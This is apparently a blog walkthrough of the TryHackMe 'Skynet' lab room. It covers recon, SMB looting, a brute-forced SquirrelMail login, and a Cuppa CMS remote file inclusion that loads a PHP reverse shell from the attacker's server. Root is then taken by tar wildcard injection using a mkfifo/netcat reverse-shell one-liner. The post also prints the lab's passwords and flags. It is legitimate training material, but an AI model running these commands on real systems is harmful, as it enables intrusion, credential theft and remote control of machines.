---
id: 540
title: "Tryhackme Skynet Walkthrough"
created: 2023-07-26T15:20:14+00:00
url: https://hacklido.com/blog/540-tryhackme-skynet-walkthrough
words: 2244
---

# Tryhackme Skynet Walkthrough

[image]

This time on tryhackme we will be looking on how to solve a linux based machine from tryhackme. In a nutshell we will perform recon, use smb to get files, do some brute force attacks on mail login page, gain some more information, and then do additional recon [directory busting], exploit a website based on RFI vulnerability or remote file inclusion, and then escalate our privileges and get the sweet root flag. If this sounds like easy, awesome, if not then do remember that this room is just a stack of basic things which most of us are familiar if not used to these tools. Without wasting our time let’s get started.

# 1. Recon

Since this is a web based machine [hosted on linux], we will waste less time on nmap scan, and as we know that in ctf environments, most of the time we are expected to face something juicy on the directories of a website, let’s focus our all of our efforts here. We are also familiar with the fact that usually common word list of word list from seclist or dirbuster directory lists, but this time we will rely on dirb’s common.txt which is more reliable, short, and time saving. As usual we will be firing of gobuster, `dir` specifies that we are performing directory busting, `-u` specifies the url, and `-w` mentions the wordlists. We included `-x` just in case we don’t miss webpages that end with .html or .txt or .php.

```
`gobuster dir -u http://10.10.131.199 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html | tee gobuster.txt`
```

[image]

Among all `/squirrelmail` stands apart. In this room we will be brute-forcing login credentials on this website, but before that let’s gather some more information. Without wasting our time let’s perform nmap scan which covers script scanning, vulnerability scanning, service and operating system detection. Let’s save it to `skynet.xml` to that later on we can convert into `.html` report using `xsltproc` utility.

```
`sudo nmap -A -sS 10.10.131.199 --script=vuln -oX skynet.xml --stats-every 5s`
```

```
`sudo apt-get install xsltproc
xsltproc skynet.xml -o skynet.html`
```

Our full report of the nmap looks something like this. For the sake of full walk-through experience, all the output have been displayed in this walk-through.

[image]

[image]

[image]

# 2. SMB….

From our nmap scan, we see port 139 and port 445 open which means smb is open. One can use `smbmap` or `smbclient` to gather information and to login to the remote system using smb protocol to collection resources such as files and other important media. First let’s quickly list out the `smb shares` on this machine using `smbclient`.

```
`smblicent -L 10.10.131.199`
```

[image]

We cab see that there is anonymous share enabled in this machine, so let’s login to the `smb share` as `guest` and take a look on what’s inside `anonymous share`.

```
`smbclient //10.10.131.199/anonymous -u Guest`
```

[image]

[image]

One can use `get [filename]` to get the specified file from smb to our machine or use `mget *` to get all files within the folder to our system.  First we see `attention.txt` which displays our user’s name as `Miles Dyson`, which means our username could be `milesdyson`. Note that this information is very important as we will be using the same username for almost everything in the upcoming tasks.

[image]

Also do note that `log2.txt` and `log3.txt` are empty, and we can see that in `log1.txt` we have a set of passwords. Hmm, let’s think for a while, we have got `/squirrelmail` directory, and we have realized that the username is `milesdyson` and we have a list of possible passwords. Wonder where does it lead to?

[image]

[image]

# 3. Brute-forcing credentials ….

Yes you have guessed it right, we will be brute forcing credentials with the information we found from step 1 and step 2. For this one can either copy the web-request, and then use hydra to brute force, similar to what we do on `hackpark` machine, but this time we will be relying on intruder for bruteforcing. Why you ask? because it’s simple and easy, even though it’s a slow process it is worth your time. First we turn on our brup suite, turn on proxy, gather our false login attemp, right click and then send the web request to the intruder.

[image]

Once the web request reaches the intruder, then in the `secretkey` value, use the add option to select a payload. By default burp does for us and one does not have to work hard, atleast for this one.

[image]

Now from the positions, switch to payload tab, under section section called `Payload settings [simple list]` , load your `log1.txt` which will act like our wordlist for the bruteforce. Once done hit on `start attack` button.

[image]

After some time, you should see the results, make a keen note of abnormal status code, which in our case is `302` and turns out the payload with the value named `cyborg007haloterminator` is the password for our mail service hosted on `/squirrelmail`.

[image]

Question

- What is Miles password for his emails?

```
`cyborg007haloterminator`
```

Now after logging in to the email, we see three emails, and one of them contains `samba password reset`, which holds the key for the next task, that is we will be using this password to login to the smb as milesdyson

[image]

The first e-mail tells us that we have changed smb password, and gives our smb password.

[image]

```
`)s{A&2Z=F^n_E.B``
```

The rest of the two e-mails contains giberish data, or the data that is not really helpful in completing this room. For the sake of knowing one can take a look at these data, and have fun decoding or reading the messages from the rest of the email. Again do note that these are not important to know in order to solve the room.

# 4. Again smb

This is the shortest and smallest task we will ever do, although this is not an separate task, it helps us to answer one of the question. First we make note of the password which we got from our first e-mail and then login to the smb share called `milesdyson` which we previously discovered on recon section. Now we also know the username obviously so let’s login to this smb share as our user (milesdyson).

```
`smbclient //10.10.131.199/milesdyson -U milesdyson`
```

Once you got into the smb share, then simply go through what’s available in your share using `ls` command and then follow the following steps to get `important.txt` into your system.

```
`cd notes
get important.txt`
```

The contents of this `important.txt` reveals an secret hidden directory.

[image]

Questions

- What is the hidden directory?

```
`/45kra24zxs28v3yd`
```

# 5. Directory brute forcing

Now visiting our newly discovered secret hidden directory on the machine, we should see personal page of `Miles Dyson`.

[image]

Now once again let’s fire up our gobuster, this time make sure to include our newly discovered directory into the URL, and save the output using `|tee` command into a text file called `gobuster2.txt`. Make sure to include `-x` extension options as well.

```
`gobuster dir -u http://10.10.131.199/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt | tee gobuster2.txt`
```

[image]

Once the scan is done, we should find `/administrator` panel which redirects us to an login page which is hosted by `cuppa cms`. Quickly using `searchsploit` we find an `remote file inclusion vulnerability` for a cuppa cms, which is going to be the exploit we will be using on this room.

[image]

# 6. RFI {Remote File Inclusion}

Simply put if an RFI vulnerability exists in a website or web application, an attacker can include malicious external files that are later run by this website or web application (thank you Acunetix, for providing concise simple definition for this vulnerability.). Also since this is a new topic for me, thanks to `Jasper Alblas` for laying out step by step process on how to exploit this RFI vulnerability which consists of:

```
`1. Creating an php backdoor
2. Creating an hosting that backdoor from our system using simple python server.
3. Downloading this backdoor into the website using RFI vulnerability.`
```

 https://medium.com/@JAlblas/tryhackme-ctf-skynet-walkthrough-b31734973bbb TryHackMe CTF: Skynet — Walkthrough | by Jasper Alblas | Medium

As of now, one can quickly test for RFI vulnerability by checking if `/etc/passwd` is rendered via website. Once can visit on this link to double verify that this website is vulnerable to `RFI` vulnerability.

```
`http://10.10.131.199/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd`
```

For the php-reverse shell we will be relying on default webshells that comes preloaded on kali/parrot/tryhackme attackbox. Usually it is located under `/usr/share/webshells/php`.  Also do note that you can start simple python server using either `python2` or `python3`.

```
`python -m http.server
[or]
python3 -m http.server`
```

[image]

Using your favorite text editor, edit the `$ip` and `$port` as per your requirement. And before you include this file into the machine, make sure that netcat listener is running in the background.

[image]

Now do use the following command to start a netcat listener. Do note that `-n` means it tells netcat to include numeric-only IP addresses, no DNS and `-l`  for netcat to enter into listen mode, for inbound connections and `-v` for verbose and `-p` for specifying an local port number.

```
`nc -nlvp 1234`
```

Now once done, you can include this webshell into the machine/website directly without logging inside the `/administrator` page. Just simply visit the following URL and within not time you should get your shell.

```
`http://10.10.131.199/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.216.239:8000/php-reverse-shell.php`
```

Questions

- What is the vulnerability called when you can include a remote file for malicious purposes?

```
`remote file inclusion.`
```

Once we got the shell, you should notice that the shell is not stable. You can stabilize your shell using the following commands.

```
`python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
hit ctrl+z to stop the action
stty raw -echo; fg`
```

With this you should get a stable shell, and under `/home/milesdyson/` you should see `user.txt`

which will be our answer for the 4th question.

Questions

- What is the user flag?

```
`cat /home/milesdyson/user.txt`
```

[image]

# 7. Privilege Escalation.

Now one can run automated privilege escalation script such as linpeas to complete this part of the room, but we will try the other way around. First we notice that we can’t run `sudo -l` to list our permissions, so let’s try our luck to see if any crontabs is periodically owned and ran by root user. And to our luck we find one under `/home/milesdyson/backups/backup.sh`.

```
`cat /etc/crontab`
```

[image]

Now here comes the tricky part, `backup.sh` can’t be edited, and we don’t have enough privileges to do so. If we could edit this file, then we could have placed in bash reverse shell, wait for this script to execute and then after sometime, if our netcat is listening, then we would have got root shell. But this turns out so far from being true. Also I could not find any direct commands from `gtfo bins`. And our only option was to rely on official walkthrough which included the following commands .

```
`
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > shell.sh

touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"

touch "/var/www/html/--checkpoint=1"`
```

The following screnshots from explainshell.com should explain on what the above commands are actually doing under the hood.

[image]

And do note that `touch` command creates an file, LOL.

[image]

Before executing the above commands, make sure that you have netcat listening to the port you will be using. If you have done everything correctly so far, you should get the root shell.

```
`nc -nlvp 1234`
```

[image]

Questions

- What is the root flag?

```
`cat /root/root.txt`
```

 https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/ To understand better how we have escalated our privileges, check out the following blog on exploiting wildcards on linux With this we complete another room, even thought it was exhaustive, hope we have learned something valuable from it.

This Skynet walkthrough from TryHackMe had us doing alot of different things, exploiting vulns in file shares, local file inclusion vulnerabilities, insecure tar usage, enumerating with NMAP, checking our Samba shares, bruteforcing directories etc… Cracking the SquirrelMail login was another interesting task. This is why I love TryHackMe, you really have no idea what you’re getting into with each box, making it fun and exciting every time. If you had any issue following my process here, you can check out this  https://guidedhacking.com/threads/tryhackme-skynet-walkthrough.17799/ TryHackMe writeup from a friend who approached this box a little differently.



---

## Author follow-up 2

https://hacklido.com/blog/540/2 CHHOTEChoudhry Could you please elaborate what you mean bro?
